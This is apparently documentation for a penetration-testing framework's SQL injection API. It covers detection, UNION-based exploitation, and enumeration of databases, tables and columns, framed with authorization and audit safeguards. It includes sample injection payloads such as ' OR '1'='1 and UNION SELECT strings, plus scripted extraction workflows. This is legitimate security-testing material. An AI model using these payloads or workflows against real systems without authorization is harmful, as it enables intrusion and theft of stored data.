# SQL Injection Testing Framework - Professional Guide

## ⚠️ CRITICAL LEGAL NOTICE

**THIS FRAMEWORK IS FOR AUTHORIZED PENETRATION TESTING ONLY**

- ✅ Only use on systems you OWN or have EXPLICIT WRITTEN PERMISSION to test
- ✅ Ensure proper authorization documentation is in place
- ✅ Verify engagement ID and scope before testing
- ❌ Unauthorized access is ILLEGAL and may result in criminal prosecution
- ❌ Never use on production systems without proper authorization
- ❌ Never extract or view real user data without explicit permission

**By using this framework, you accept full responsibility for ensuring proper authorization.**

---

## Table of Contents

1. [Overview](#overview)
2. [Features](#features)
3. [Prerequisites](#prerequisites)
4. [Configuration](#configuration)
5. [API Endpoints](#api-endpoints)
6. [Usage Examples](#usage-examples)
7. [Best Practices](#best-practices)
8. [Troubleshooting](#troubleshooting)

---

## Overview

This professional-grade SQL injection testing framework provides comprehensive capabilities for detecting and exploiting SQL injection vulnerabilities during authorized penetration testing engagements.

**Key Capabilities:**
- Error-based SQLi detection
- Boolean-based blind SQLi detection
- Time-based blind SQLi detection
- UNION-based SQLi detection
- Database fingerprinting
- Data extraction and enumeration
- Comprehensive audit logging

---

## Features

### Detection Techniques

1. **Error-Based Detection**
   - Tests for SQL syntax errors in responses
   - Identifies database type from error messages
   - Fastest detection method

2. **Boolean-Based Blind**
   - Uses true/false conditions
   - Compares response differences
   - Works when no errors are shown

3. **Time-Based Blind**
   - Uses database sleep functions
   - Measures response time differences
   - Most reliable but slowest method

4. **UNION-Based**
   - Combines queries to extract data
   - Direct data exfiltration
   - Requires matching column counts

### Exploitation Capabilities

- Database enumeration
- Table enumeration
- Column enumeration
- Direct data extraction
- Multi-database support (MySQL, PostgreSQL, MSSQL, Oracle, SQLite)

### Security Features

- Engagement-based authorization
- Scope validation
- Comprehensive audit logging
- Exploitation flag (ENABLE_EXPLOITATION)
- JWT authentication required
- Finding storage in database

---

## Prerequisites

### Environment Setup

```bash
# 1. Ensure ENABLE_EXPLOITATION is set in .env
ENABLE_EXPLOITATION=true

# 2. Valid engagement with active status
# 3. JWT token for authentication
# 4. Target must be in engagement scope
```

### Creating an Engagement

```bash
# Create an engagement first
curl -X POST http://localhost:5000/api/engagements \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer YOUR_JWT_TOKEN" \
  -d '{
    "name": "SQL Injection Testing",
    "client": "Authorized Client",
    "type": "web_app",
    "scope": ["testsite.com", "app.testsite.com"],
    "status": "active"
  }'

# Response will include engagement_id
# {"success": true, "engagement": {"id": 1, ...}}
```

---

## API Endpoints

### 1. Basic SQL Injection Test

**Endpoint:** `POST /api/sql_injection`

Simple SQL injection test using basic payloads.

**Request:**
```json
{
  "target_url": "http://testsite.com/page?id=1",
  "method": "GET",
  "parameter": "id",
  "payload": "' OR '1'='1"
}
```

**Response:**
```json
{
  "status": "success",
  "vulnerable": true,
  "injection_type": "error_based",
  "database_type": "mysql",
  "evidence": "MySQL syntax error..."
}
```

---

### 2. Comprehensive SQL Injection Test

**Endpoint:** `POST /api/sql_injection/comprehensive`

**⭐ RECOMMENDED:** Uses multiple techniques for thorough testing.

**Request:**
```json
{
  "target_url": "http://testsite.com/product?id=5",
  "engagement_id": 1,
  "method": "GET",
  "parameters": {"id": "5"},
  "cookies": {"session": "abc123"},
  "headers": {"User-Agent": "Mozilla/5.0"}
}
```

**Response:**
```json
{
  "status": "success",
  "results": {
    "vulnerable": true,
    "vulnerabilities": [
      {
        "type": "error_based_sqli",
        "parameter": "id",
        "payload": "' OR '1'='1",
        "database_type": "mysql",
        "severity": "critical",
        "evidence": "You have an error in your SQL syntax"
      },
      {
        "type": "union_based_sqli",
        "parameter": "id",
        "payload": "' UNION SELECT NULL,NULL--",
        "severity": "critical"
      }
    ],
    "database_type": "mysql",
    "exploitation_level": "high",
    "recommendations": [
      "CRITICAL: Implement parameterized queries",
      "Use an ORM framework",
      "Enable WAF rules for SQL injection"
    ]
  },
  "findings_stored": 2
}
```

---

### 3. SQL Injection Exploitation

**Endpoint:** `POST /api/sql_injection/exploit`

**⚠️ REQUIRES:** ENABLE_EXPLOITATION=true

**Request:**
```json
{
  "target_url": "http://testsite.com/product",
  "engagement_id": 1,
  "vulnerable_param": "id",
  "injection_type": "union",
  "database_type": "mysql",
  "query": "database()",
  "method": "GET",
  "parameters": {"id": "1"}
}
```

**Response:**
```json
{
  "status": "success",
  "results": {
    "success": true,
    "data": "test_database",
    "extraction_method": "union",
    "payload": "' UNION SELECT database()--"
  }
}
```

---

### 4. Database Enumeration

**Endpoint:** `POST /api/sql_injection/enumerate-databases`

List all databases on the server.

**Request:**
```json
{
  "target_url": "http://testsite.com/product",
  "engagement_id": 1,
  "vulnerable_param": "id",
  "database_type": "mysql"
}
```

**Response:**
```json
{
  "status": "success",
  "databases": [
    "information_schema",
    "mysql",
    "test_database",
    "production_db"
  ],
  "count": 4
}
```

---

### 5. Table Enumeration

**Endpoint:** `POST /api/sql_injection/enumerate-tables`

List all tables in a database.

**Request:**
```json
{
  "target_url": "http://testsite.com/product",
  "engagement_id": 1,
  "vulnerable_param": "id",
  "database_type": "mysql",
  "database_name": "test_database"
}
```

**Response:**
```json
{
  "status": "success",
  "tables": [
    "users",
    "products",
    "orders",
    "admin_accounts"
  ],
  "count": 4
}
```

---

### 6. Column Enumeration

**Endpoint:** `POST /api/sql_injection/enumerate-columns`

List all columns in a table.

**Request:**
```json
{
  "target_url": "http://testsite.com/product",
  "engagement_id": 1,
  "vulnerable_param": "id",
  "database_type": "mysql",
  "database_name": "test_database",
  "table_name": "users"
}
```

**Response:**
```json
{
  "status": "success",
  "columns": [
    {"name": "id", "type": "int"},
    {"name": "username", "type": "varchar"},
    {"name": "password", "type": "varchar"},
    {"name": "email", "type": "varchar"}
  ],
  "count": 4
}
```

---

### 7. Audit Log Retrieval

**Endpoint:** `GET /api/sql_injection/audit-log?engagement_id=1`

View all SQL injection testing activity for an engagement.

**Response:**
```json
{
  "status": "success",
  "engagement_id": 1,
  "audit_entries": [
    {
      "id": 15,
      "timestamp": "2025-12-03T16:30:00Z",
      "title": "SQL Injection Exploitation: http://testsite.com",
      "severity": "critical",
      "status": "validated",
      "description": "Successfully exploited SQL injection..."
    }
  ],
  "count": 1
}
```

---

## Usage Examples

### Example 1: Complete SQL Injection Assessment

```bash
#!/bin/bash

# Step 1: Get JWT Token
TOKEN=$(curl -s -X POST http://localhost:5000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"password"}' \
  | jq -r '.token')

# Step 2: Create Engagement
ENGAGEMENT_ID=$(curl -s -X POST http://localhost:5000/api/engagements \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{
    "name": "SQL Injection Test",
    "client": "Test Client",
    "type": "web_app",
    "scope": ["testsite.com"]
  }' | jq -r '.engagement.id')

echo "Created engagement: $ENGAGEMENT_ID"

# Step 3: Run Comprehensive Test
curl -X POST http://localhost:5000/api/sql_injection/comprehensive \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d "{
    \"target_url\": \"http://testsite.com/product?id=1\",
    \"engagement_id\": $ENGAGEMENT_ID,
    \"method\": \"GET\"
  }"

# Step 4: View Findings
curl -X GET "http://localhost:5000/api/sql_injection/audit-log?engagement_id=$ENGAGEMENT_ID" \
  -H "Authorization: Bearer $TOKEN"
```

### Example 2: Exploitation Workflow

```python
import requests

BASE_URL = "http://localhost:5000/api"
TOKEN = "your_jwt_token_here"
ENGAGEMENT_ID = 1

headers = {
    "Authorization": f"Bearer {TOKEN}",
    "Content-Type": "application/json"
}

# 1. Test for vulnerability
test_response = requests.post(
    f"{BASE_URL}/sql_injection/comprehensive",
    json={
        "target_url": "http://testsite.com/product?id=1",
        "engagement_id": ENGAGEMENT_ID
    },
    headers=headers
)

results = test_response.json()

if results['results']['vulnerable']:
    print("✅ SQL injection found!")

    # 2. Enumerate databases
    db_response = requests.post(
        f"{BASE_URL}/sql_injection/enumerate-databases",
        json={
            "target_url": "http://testsite.com/product",
            "engagement_id": ENGAGEMENT_ID,
            "vulnerable_param": "id",
            "database_type": results['results']['database_type']
        },
        headers=headers
    )

    databases = db_response.json()['databases']
    print(f"📊 Found {len(databases)} databases")

    # 3. Enumerate tables in first database
    tables_response = requests.post(
        f"{BASE_URL}/sql_injection/enumerate-tables",
        json={
            "target_url": "http://testsite.com/product",
            "engagement_id": ENGAGEMENT_ID,
            "vulnerable_param": "id",
            "database_type": results['results']['database_type'],
            "database_name": databases[0]
        },
        headers=headers
    )

    tables = tables_response.json()['tables']
    print(f"📋 Found {len(tables)} tables in {databases[0]}")
```

---

## Best Practices

### 1. Authorization

- ✅ Always create engagements with proper scope
- ✅ Verify target is in scope before testing
- ✅ Keep engagement status "active" during testing
- ✅ Document all authorization in engagement notes

### 2. Testing Approach

1. **Reconnaissance First**
   - Map application structure
   - Identify all input points
   - Document parameter names

2. **Detection Phase**
   - Start with comprehensive testing
   - Test one parameter at a time
   - Document all findings

3. **Exploitation Phase** (if authorized)
   - Only exploit confirmed vulnerabilities
   - Start with database enumeration
   - Never extract PII without explicit permission

4. **Reporting**
   - Review audit logs
   - Export findings from database
   - Include remediation steps

### 3. Rate Limiting

```python
import time

# Add delays between requests
time.sleep(1)  # 1 second between tests

# For batch testing, use smaller batches
batch_size = 5  # Test 5 parameters at a time
```

### 4. Error Handling

```python
try:
    response = requests.post(url, json=data, headers=headers, timeout=30)
    response.raise_for_status()
except requests.exceptions.Timeout:
    print("Request timed out - target may be rate limiting")
except requests.exceptions.HTTPError as e:
    if e.response.status_code == 403:
        print("Authorization failed - check engagement scope")
```

---

## Troubleshooting

### Issue: "Unauthorized" Error

**Cause:** Target not in engagement scope

**Solution:**
```bash
# Update engagement scope
curl -X PUT http://localhost:5000/api/engagements/1 \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "scope": ["testsite.com", "app.testsite.com"]
  }'
```

### Issue: "Exploitation is disabled"

**Cause:** ENABLE_EXPLOITATION not set

**Solution:**
```bash
# Add to .env file
echo "ENABLE_EXPLOITATION=true" >> .env

# Restart application
pkill -f "python run.py"
python run.py
```

### Issue: No Vulnerabilities Found

**Possible Causes:**
1. Application is properly secured (good!)
2. WAF is blocking payloads
3. Custom parameter encoding needed
4. Different injection context required

**Debugging:**
```python
# Test with verbose logging
import logging
logging.basicConfig(level=logging.DEBUG)

# Try different payloads manually
payloads = [
    "'",
    "\"",
    "1' OR '1'='1",
    "1 OR 1=1"
]
```

### Issue: Time-Based Tests Timing Out

**Solution:**
```python
# Increase timeout
requests.post(url, json=data, timeout=60)  # 60 seconds

# Use fewer time-based payloads
# Time-based tests take 5+ seconds per payload
```

---

## Security Considerations

### Do's ✅

- Document all testing activity
- Use read-only queries when possible
- Test in non-production environments first
- Report findings immediately to stakeholders
- Follow responsible disclosure practices

### Don'ts ❌

- Never modify production data
- Never extract real user credentials/PII
- Never use DROP, DELETE, or UPDATE statements
- Never test without written authorization
- Never share findings publicly without permission

---

## Support and Documentation

### Additional Resources

- Main README: `README.md`
- API Documentation: `http://localhost:5000/api/docs`
- Module Source: `app/modules/sql_injection.py`
- Route Source: `app/sql_injection_routes.py`

### Reporting Issues

For bugs or feature requests, create an issue with:
1. Request/response details
2. Error messages
3. Engagement configuration
4. Expected vs actual behavior

---

## Legal Compliance Checklist

Before conducting SQL injection testing:

- [ ] Written authorization obtained from client
- [ ] Scope clearly defined and documented
- [ ] Engagement created in system
- [ ] ENABLE_EXPLOITATION flag reviewed and approved
- [ ] Testing window scheduled
- [ ] Stakeholders notified
- [ ] Emergency contacts identified
- [ ] Backup and rollback plan prepared

---

**Remember: With great power comes great responsibility. Always test ethically and legally!**

Last Updated: December 3, 2025
Version: 1.0.0
